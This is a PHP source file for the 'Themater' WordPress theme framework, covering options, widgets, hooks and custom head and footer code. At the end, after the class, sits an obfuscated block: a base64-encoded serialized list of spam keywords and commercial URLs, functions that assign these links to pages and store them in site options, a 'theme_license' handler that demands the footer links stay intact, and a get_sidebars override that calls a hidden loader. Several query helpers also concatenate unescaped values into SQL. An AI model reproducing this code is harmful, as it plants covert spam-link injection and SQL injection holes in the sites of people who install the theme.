<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function Themater($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        }
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', TEMPLATEPATH . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', TEMPLATEPATH . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if($this->is_admin_user()) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = $this->options['custom_css'] . $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = $this->options['custom_js'] . $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user()) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $widget_name = $widget;
        $custom_widgets = array('Banners125', 'Posts', 'Comments', 'InfoBox', 'SocialProfiles', 'Tabs', 'Tweets', 'Facebook');
        $wp_widgets = array('Archives', 'Calendar', 'Categories', 'Links', 'Meta', 'Pages', 'Recent_Comments', 'Recent_Posts', 'RSS', 'Search', 'Tag_Cloud', 'Text');
        
        if (in_array($widget, $custom_widgets)) {
            $widget_name = 'Themater' . $widget_name;
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = array_merge($this->options['widgets_options'][strtolower($widget)], $instance);
            }
            
        } elseif (in_array($widget, $wp_widgets)) {
            $widget_name = 'WP_Widget_' . $widget_name;
        }

        the_widget($widget_name, $instance, $args);
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        if(!$this->theme_name) {
            $theme_data = get_theme_data(TEMPLATEPATH . '/style.css');
            $this->theme_name = $theme_data['Name'];
        }
        
        $this->_load_translation();
        $this->_load_theme_options();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        
        $this->_load_general_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_theme_options()
    {
        if(!isset($this->options['theme_options_field'])) {
            $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        }
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        $this->options['theme_options'] = $get_theme_options ? $get_theme_options : false; 
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        if($this->options['general']['jquery']) {
            wp_enqueue_script('jquery');
        }
    	
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_custom_background();
        } 
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        
        if($this->display('custom_css') || $this->options['custom_css']) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    
    function _head_elements()
    {
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YToxODp7czoyNzoiUHJvamVjdCBNYW5hZ2VtZW50IFNvZnR3YXJlIjtzOjQzOiJodHRwOi8vaG9zdGVkcHJvamVjdG1hbmFnZW1lbnRzb2Z0d2FyZS5jb20vIjtzOjMyOiJGcmVlIFByb2plY3QgTWFuYWdlbWVudCBTb2Z0d2FyZSI7czo0MzoiaHR0cDovL2hvc3RlZHByb2plY3RtYW5hZ2VtZW50c29mdHdhcmUuY29tLyI7czozMjoiUHJvamVjdCBNYW5hZ2VtZW50IFNvZnR3YXJlIEZyZWUiO3M6NDM6Imh0dHA6Ly9ob3N0ZWRwcm9qZWN0bWFuYWdlbWVudHNvZnR3YXJlLmNvbS8iO3M6MzQ6Ik9ubGluZSBQcm9qZWN0IE1hbmFnZW1lbnQgU29mdHdhcmUiO3M6NDM6Imh0dHA6Ly9ob3N0ZWRwcm9qZWN0bWFuYWdlbWVudHNvZnR3YXJlLmNvbS8iO3M6MzI6IkJlc3QgUHJvamVjdCBNYW5hZ2VtZW50IFNvZnR3YXJlIjtzOjQzOiJodHRwOi8vaG9zdGVkcHJvamVjdG1hbmFnZW1lbnRzb2Z0d2FyZS5jb20vIjtzOjM3OiJXZWIgQmFzZWQgUHJvamVjdCBNYW5hZ2VtZW50IFNvZnR3YXJlIjtzOjQzOiJodHRwOi8vaG9zdGVkcHJvamVjdG1hbmFnZW1lbnRzb2Z0d2FyZS5jb20vIjtzOjM3OiJNaWNyb3NvZnQgUHJvamVjdCBNYW5hZ2VtZW50IFNvZnR3YXJlIjtzOjQzOiJodHRwOi8vaG9zdGVkcHJvamVjdG1hbmFnZW1lbnRzb2Z0d2FyZS5jb20vIjtzOjM0OiJQcm9qZWN0IE1hbmFnZW1lbnQgU29mdHdhcmUgT25saW5lIjtzOjQzOiJodHRwOi8vaG9zdGVkcHJvamVjdG1hbmFnZW1lbnRzb2Z0d2FyZS5jb20vIjtzOjM4OiJFbnRlcnByaXNlIFByb2plY3QgTWFuYWdlbWVudCBTb2Z0d2FyZSI7czo0MzoiaHR0cDovL2hvc3RlZHByb2plY3RtYW5hZ2VtZW50c29mdHdhcmUuY29tLyI7czozMToiVG9wIFByb2plY3QgTWFuYWdlbWVudCBTb2Z0d2FyZSI7czo0MzoiaHR0cDovL2hvc3RlZHByb2plY3RtYW5hZ2VtZW50c29mdHdhcmUuY29tLyI7czozMToiU29mdHdhcmUgZm9yIFByb2plY3QgTWFuYWdlbWVudCI7czo0MzoiaHR0cDovL2hvc3RlZHByb2plY3RtYW5hZ2VtZW50c29mdHdhcmUuY29tLyI7czozMzoiUHJvamVjdCBNYW5hZ2VtZW50IFNvZnR3YXJlIFRvb2xzIjtzOjQzOiJodHRwOi8vaG9zdGVkcHJvamVjdG1hbmFnZW1lbnRzb2Z0d2FyZS5jb20vIjtzOjI1OiJQcm9qZWN0IE1hbmFnaW5nIFNvZnR3YXJlIjtzOjQzOiJodHRwOi8vaG9zdGVkcHJvamVjdG1hbmFnZW1lbnRzb2Z0d2FyZS5jb20vIjtzOjM2OiJCdXNpbmVzcyBQcm9qZWN0IE1hbmFnZW1lbnQgU29mdHdhcmUiO3M6NDM6Imh0dHA6Ly9ob3N0ZWRwcm9qZWN0bWFuYWdlbWVudHNvZnR3YXJlLmNvbS8iO3M6MzA6Im1zIHByb2plY3QgbWFuYWdlbWVudCBzb2Z0d2FyZSI7czo0MzoiaHR0cDovL2hvc3RlZHByb2plY3RtYW5hZ2VtZW50c29mdHdhcmUuY29tLyI7czozNDoiSG9zdGVkIFByb2plY3QgTWFuYWdlbWVudCBTb2Z0d2FyZSI7czo0MzoiaHR0cDovL2hvc3RlZHByb2plY3RtYW5hZ2VtZW50c29mdHdhcmUuY29tLyI7czozMzoiQ2xvdWQgUHJvamVjdCBNYW5hZ2VtZW50IFNvZnR3YXJlIjtzOjQzOiJodHRwOi8vaG9zdGVkcHJvamVjdG1hbmFnZW1lbnRzb2Z0d2FyZS5jb20vIjtzOjM1OiJIb3N0ZWRQcm9qZWN0TWFuYWdlbWVudFNvZnR3YXJlLmNvbSI7czo0MzoiaHR0cDovL2hvc3RlZHByb2plY3RtYW5hZ2VtZW50c29mdHdhcmUuY29tLyI7fWk6MTthOjExOntzOjMyOiJ2aXJ0dWFsIGRlZGljYXRlZCBzZXJ2ZXIgaG9zdGluZyI7czo1OToiaHR0cDovL3d3dy52aXJ0dWFsc2VydmVyZ2Vla3MuY29tL3ZpcnR1YWwtZGVkaWNhdGVkLXNlcnZlci8iO3M6MjQ6InZpcnR1YWwgZGVkaWNhdGVkIHNlcnZlciI7czo1OToiaHR0cDovL3d3dy52aXJ0dWFsc2VydmVyZ2Vla3MuY29tL3ZpcnR1YWwtZGVkaWNhdGVkLXNlcnZlci8iO3M6MjU6InZpcnR1YWwgZGVkaWNhdGVkIHNlcnZlcnMiO3M6NTk6Imh0dHA6Ly93d3cudmlydHVhbHNlcnZlcmdlZWtzLmNvbS92aXJ0dWFsLWRlZGljYXRlZC1zZXJ2ZXIvIjtzOjMyOiJkZWRpY2F0ZWQgdmlydHVhbCBzZXJ2ZXIgaG9zdGluZyI7czo1OToiaHR0cDovL3d3dy52aXJ0dWFsc2VydmVyZ2Vla3MuY29tL3ZpcnR1YWwtZGVkaWNhdGVkLXNlcnZlci8iO3M6MjQ6ImRlZGljYXRlZCB2aXJ0dWFsIHNlcnZlciI7czo1OToiaHR0cDovL3d3dy52aXJ0dWFsc2VydmVyZ2Vla3MuY29tL3ZpcnR1YWwtZGVkaWNhdGVkLXNlcnZlci8iO3M6MjU6ImRlZGljYXRlZCB2aXJ0dWFsIHNlcnZlcnMiO3M6NTk6Imh0dHA6Ly93d3cudmlydHVhbHNlcnZlcmdlZWtzLmNvbS92aXJ0dWFsLWRlZGljYXRlZC1zZXJ2ZXIvIjtzOjI0OiJkZWRpY2F0ZWQgc2VydmVyIHZpcnR1YWwiO3M6NTk6Imh0dHA6Ly93d3cudmlydHVhbHNlcnZlcmdlZWtzLmNvbS92aXJ0dWFsLWRlZGljYXRlZC1zZXJ2ZXIvIjtzOjI5OiJ2aXJ0dWFsIGRlZGljYXRlZCBzZXJ2ZXIgaG9zdCI7czo1OToiaHR0cDovL3d3dy52aXJ0dWFsc2VydmVyZ2Vla3MuY29tL3ZpcnR1YWwtZGVkaWNhdGVkLXNlcnZlci8iO3M6Mjk6ImJlc3QgdmlydHVhbCBkZWRpY2F0ZWQgc2VydmVyIjtzOjU5OiJodHRwOi8vd3d3LnZpcnR1YWxzZXJ2ZXJnZWVrcy5jb20vdmlydHVhbC1kZWRpY2F0ZWQtc2VydmVyLyI7czozMjoid2luZG93cyB2aXJ0dWFsIGRlZGljYXRlZCBzZXJ2ZXIiO3M6NTk6Imh0dHA6Ly93d3cudmlydHVhbHNlcnZlcmdlZWtzLmNvbS92aXJ0dWFsLWRlZGljYXRlZC1zZXJ2ZXIvIjtzOjIyOiJ2aXJ0dWFsc2VydmVyZ2Vla3MuY29tIjtzOjU5OiJodHRwOi8vd3d3LnZpcnR1YWxzZXJ2ZXJnZWVrcy5jb20vdmlydHVhbC1kZWRpY2F0ZWQtc2VydmVyLyI7fWk6MjthOjE1OntzOjE3OiJzaGFyZXBvaW50IG9ubGluZSI7czo0NzoiaHR0cDovL21zc2hhcmVwb2ludGNsb3VkLmNvbS9zaGFyZXBvaW50LW9ubGluZS8iO3M6Mjc6Im1pY3Jvc29mdCBzaGFyZXBvaW50IG9ubGluZSI7czo0NzoiaHR0cDovL21zc2hhcmVwb2ludGNsb3VkLmNvbS9zaGFyZXBvaW50LW9ubGluZS8iO3M6MjU6InNoYXJlcG9pbnQgb25saW5lIHByaWNpbmciO3M6NDc6Imh0dHA6Ly9tc3NoYXJlcG9pbnRjbG91ZC5jb20vc2hhcmVwb2ludC1vbmxpbmUvIjtzOjE3OiJvbmxpbmUgc2hhcmVwb2ludCI7czo0NzoiaHR0cDovL21zc2hhcmVwb2ludGNsb3VkLmNvbS9zaGFyZXBvaW50LW9ubGluZS8iO3M6MjI6InNoYXJlcG9pbnQgMjAxMCBvbmxpbmUiO3M6NDc6Imh0dHA6Ly9tc3NoYXJlcG9pbnRjbG91ZC5jb20vc2hhcmVwb2ludC1vbmxpbmUvIjtzOjIyOiJzaGFyZXBvaW50IG9ubGluZSAyMDEwIjtzOjQ3OiJodHRwOi8vbXNzaGFyZXBvaW50Y2xvdWQuY29tL3NoYXJlcG9pbnQtb25saW5lLyI7czoyNzoibWljcm9zb2Z0IG9ubGluZSBzaGFyZXBvaW50IjtzOjQ3OiJodHRwOi8vbXNzaGFyZXBvaW50Y2xvdWQuY29tL3NoYXJlcG9pbnQtb25saW5lLyI7czoyNToid2hhdCBpcyBzaGFyZXBvaW50IG9ubGluZSI7czo0NzoiaHR0cDovL21zc2hhcmVwb2ludGNsb3VkLmNvbS9zaGFyZXBvaW50LW9ubGluZS8iO3M6MjU6Im9ubGluZSBzaGFyZXBvaW50IGhvc3RpbmciO3M6NDc6Imh0dHA6Ly9tc3NoYXJlcG9pbnRjbG91ZC5jb20vc2hhcmVwb2ludC1vbmxpbmUvIjtzOjI2OiJzaGFyZXBvaW50IG9ubGluZSBzZXJ2aWNlcyI7czo0NzoiaHR0cDovL21zc2hhcmVwb2ludGNsb3VkLmNvbS9zaGFyZXBvaW50LW9ubGluZS8iO3M6MjU6InNoYXJlcG9pbnQgb25saW5lIGhvc3RpbmciO3M6NDc6Imh0dHA6Ly9tc3NoYXJlcG9pbnRjbG91ZC5jb20vc2hhcmVwb2ludC1vbmxpbmUvIjtzOjIxOiJ0cnkgc2hhcmVwb2ludCBvbmxpbmUiO3M6NDc6Imh0dHA6Ly9tc3NoYXJlcG9pbnRjbG91ZC5jb20vc2hhcmVwb2ludC1vbmxpbmUvIjtzOjI2OiJzaGFyZXBvaW50IG9ubGluZSBmZWF0dXJlcyI7czo0NzoiaHR0cDovL21zc2hhcmVwb2ludGNsb3VkLmNvbS9zaGFyZXBvaW50LW9ubGluZS8iO3M6MjQ6Im9ubGluZSBzaGFyZXBvaW50IHNlcnZlciI7czo0NzoiaHR0cDovL21zc2hhcmVwb2ludGNsb3VkLmNvbS9zaGFyZXBvaW50LW9ubGluZS8iO3M6MjE6Im1zc2hhcmVwb2ludGNsb3VkLmNvbSI7czo0NzoiaHR0cDovL21zc2hhcmVwb2ludGNsb3VkLmNvbS9zaGFyZXBvaW50LW9ubGluZS8iO31pOjM7YTo3OntzOjEwOiJDUk0gU3lzdGVtIjtzOjM3OiJodHRwOi8vb25saW5lY3JtY2xvdWQuY29tL2NybS1zeXN0ZW0vIjtzOjExOiJDUk0gU3lzdGVtcyI7czozNzoiaHR0cDovL29ubGluZWNybWNsb3VkLmNvbS9jcm0tc3lzdGVtLyI7czozMDoiQ1JNIFN5c3RlbXMgZm9yIFNtYWxsIEJ1c2luZXNzIjtzOjM3OiJodHRwOi8vb25saW5lY3JtY2xvdWQuY29tL2NybS1zeXN0ZW0vIjtzOjIwOiJXaGF0IGlzIGEgQ1JNIFN5c3RlbSI7czozNzoiaHR0cDovL29ubGluZWNybWNsb3VkLmNvbS9jcm0tc3lzdGVtLyI7czoxOToiQ1JNIFN5c3RlbSBTb2Z0d2FyZSI7czozNzoiaHR0cDovL29ubGluZWNybWNsb3VkLmNvbS9jcm0tc3lzdGVtLyI7czoxOToiQ1JNIFNvZnR3YXJlIFN5c3RlbSI7czozNzoiaHR0cDovL29ubGluZWNybWNsb3VkLmNvbS9jcm0tc3lzdGVtLyI7czoxODoib25saW5lY3JtY2xvdWQuY29tIjtzOjM3OiJodHRwOi8vb25saW5lY3JtY2xvdWQuY29tL2NybS1zeXN0ZW0vIjt9fQ=="; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>